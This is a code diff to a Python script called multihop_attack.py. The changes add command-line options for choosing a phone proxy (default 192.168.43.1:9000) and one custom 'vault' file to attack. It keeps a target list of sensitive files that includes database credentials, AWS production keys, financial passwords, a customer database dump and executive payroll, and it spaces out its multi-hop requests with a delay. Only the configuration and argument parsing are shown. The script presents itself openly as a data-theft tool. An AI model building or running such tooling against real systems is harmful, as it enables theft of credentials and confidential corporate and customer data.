@@ -21,9 +21,22 @@ import urllib.error
 # 1. CONFIGURATION: PROXY URL & VAULT FILES (EASILY CHANGEABLE)
 # =============================================================================
 # Target Phone Proxy URL (Device B).
-# Replace with your phone's IP address and port (e.g., 192.168.43.1 if using Phone Hotspot)
+# e.g.: python multihop_attack.py http://192.168.43.1:9000
+#   or: python multihop_attack.py http://192.168.43.1:9000 my_secret.txt
 DEFAULT_PHONE_PROXY = "http://192.168.43.1:9000"
-PROXY_URL = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_PHONE_PROXY
+
+custom_file = None
+if len(sys.argv) > 2:
+    PROXY_URL = sys.argv[1]
+    custom_file = sys.argv[2]
+elif len(sys.argv) == 2:
+    if sys.argv[1].startswith("http://") or sys.argv[1].startswith("https://") or ":" in sys.argv[1]:
+        PROXY_URL = sys.argv[1]
+    else:
+        PROXY_URL = DEFAULT_PHONE_PROXY
+        custom_file = sys.argv[1]
+else:
+    PROXY_URL = DEFAULT_PHONE_PROXY
 
 # Normalize URL
 if not PROXY_URL.startswith("http://") and not PROXY_URL.startswith("https://"):
@@ -32,15 +45,20 @@ if not PROXY_URL.startswith("http://") and not PROXY_URL.startswith("https://"):
 # --- EDIT OR ADD FILES TO FETCH FROM THE VAULT HERE ---
 VAULT_FILES = [
     # (Friendly Description, Vault File Endpoint)
-    ("Database Credentials",      "/vault/credentials.env.enc"),
-    ("Customer SQL Database Dump", "/vault/customer_database_dump.sql"),
-    ("Proprietary Source Code",   "/vault/source_code.zip"),
-    ("AWS Production Cloud Keys",  "/vault/aws_production_keys.env"),
-    ("Corporate Financial Passwords", "/vault/financial_passwords_2026.xlsx"),
-    ("Executive Payroll & Salaries",  "/vault/executive_payroll_salaries.pdf"),
-    ("Internal Network Topology", "/vault/internal_network_topology.txt"),
-    ("R&D Secret Project Intel",  "/vault/secret_project_intel.txt"),
+    ("Database Credentials",         "/vault/credentials.env.enc"),
+    ("Customer SQL Database Dump",    "/vault/customer_database_dump.sql"),
+    ("Proprietary Source Code",      "/vault/source_code.zip"),
+    ("AWS Production Cloud Keys",     "/vault/aws_production_keys.env"),
+    ("Corporate Financial Passwords","/vault/financial_passwords_2026.xlsx"),
+    ("Executive Payroll & Salaries", "/vault/executive_payroll_salaries.pdf"),
+    ("Internal Network Topology",    "/vault/internal_network_topology.txt"),
+    ("R&D Secret Project Intel",     "/vault/secret_project_intel.txt"),
 ]
+
+# If a specific custom file was passed in the command line, attack only that file:
+if custom_file:
+    clean_name = custom_file.strip("/").replace("vault/", "")
+    VAULT_FILES = [(f"Custom Target File ({clean_name})", f"/vault/{clean_name}")]
 
 # Delay in seconds between multi-hop requests
 DELAY_BETWEEN_HOPS = 2.5
